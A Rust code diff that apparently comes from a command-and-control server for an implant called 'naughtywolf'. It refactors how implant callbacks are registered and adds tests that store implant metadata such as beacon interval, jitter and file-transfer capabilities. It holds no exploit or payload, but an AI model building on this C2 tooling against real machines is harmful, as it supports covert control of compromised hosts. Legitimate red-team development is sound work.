@@ -126,18 +126,9 @@ async fn process_sealed_register(
         .map_err(|_| C2Error::Unauthorized)?;
     let derived = crypto::derive_key(&shared, crypto::SESSION_SALT);
     let session_id = Uuid::new_v4();
-    repo.upsert_callback_with_protocol(
-        &session_id.to_string(),
-        &register.hostname,
-        &register.username,
-        &register.os,
-        &register.arch,
-        register.pid,
-        &b64(&derived),
-        protocol,
-    )
-    .await
-    .map_err(|_| C2Error::Internal)?;
+    repo.upsert_callback_registration(&session_id.to_string(), &register, &b64(&derived), protocol)
+        .await
+        .map_err(|_| C2Error::Internal)?;
     let reply_id = env.id + 1;
     let ack = RegisterAck {
         session_id,
@@ -242,17 +233,9 @@ async fn register(
     let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);
 
     let sid = Uuid::new_v4();
-    repo.upsert_callback(
-        &sid.to_string(),
-        &reg.hostname,
-        &reg.username,
-        &reg.os,
-        &reg.arch,
-        reg.pid,
-        &b64(&session_key),
-    )
-    .await
-    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    repo.upsert_callback_registration(&sid.to_string(), &reg, &b64(&session_key), "http")
+        .await
+        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
     let ack = RegisterAck {
         session_id: sid,
@@ -482,6 +465,18 @@ mod tests {
             arch: "aarch64".into(),
             pid: 1234,
             addr: "127.0.0.1".into(),
+            os_version: Some("macOS 15.0".into()),
+            executable_path: Some("/opt/naughtywolf/nw-implant".into()),
+            local_addr: Some("10.20.30.40".into()),
+            implant_version: Some("0.1.0".into()),
+            interval_ms: Some(20_000),
+            jitter_ms: Some(2_000),
+            capabilities: Some(nw_profile::control::CallbackCapabilities {
+                process_browser: true,
+                file_browser: true,
+                file_transfer: true,
+                task_ack: true,
+            }),
             session_key: b64(&implant_kp.public_key()),
         };
         let reg_pt = serde_json::to_vec(&reg).unwrap();
@@ -525,6 +520,28 @@ mod tests {
             .await
             .unwrap();
         assert_eq!(host, "laptop");
+        let metadata: (Option<String>, Option<String>, Option<String>, Option<String>, Option<i64>, Option<i64>, String) =
+            sqlx::query_as(
+                "SELECT os_version, executable_path, local_addr, implant_version, interval_ms, jitter_ms, capabilities_json \
+                 FROM callbacks WHERE id = ?",
+            )
+            .bind(ack_msg.session_id.to_string())
+            .fetch_one(&pool)
+            .await
+            .unwrap();
+        assert_eq!(metadata.0.as_deref(), Some("macOS 15.0"));
+        assert_eq!(metadata.1.as_deref(), Some("/opt/naughtywolf/nw-implant"));
+        assert_eq!(metadata.2.as_deref(), Some("10.20.30.40"));
+        assert_eq!(metadata.3.as_deref(), Some("0.1.0"));
+        assert_eq!(metadata.4, Some(20_000));
+        assert_eq!(metadata.5, Some(2_000));
+        assert!(metadata.6.contains("process_browser"));
+        let session_addr: String = sqlx::query_scalar("SELECT addr FROM c2_sessions WHERE id = ?")
+            .bind(ack_msg.session_id.to_string())
+            .fetch_one(&pool)
+            .await
+            .unwrap();
+        assert_eq!(session_addr, "10.20.30.40");
 
         // Poll encrypted under the derived session key.
         let poll_pt = serde_json::to_vec(&PollRequest::default()).unwrap();
@@ -565,6 +582,13 @@ mod tests {
             arch: "x86_64".into(),
             pid: 4242,
             addr: "127.0.0.1".into(),
+            os_version: None,
+            executable_path: None,
+            local_addr: None,
+            implant_version: None,
+            interval_ms: None,
+            jitter_ms: None,
+            capabilities: None,
             session_key: b64(&implant_kp.public_key()),
         };
         let register_ct =
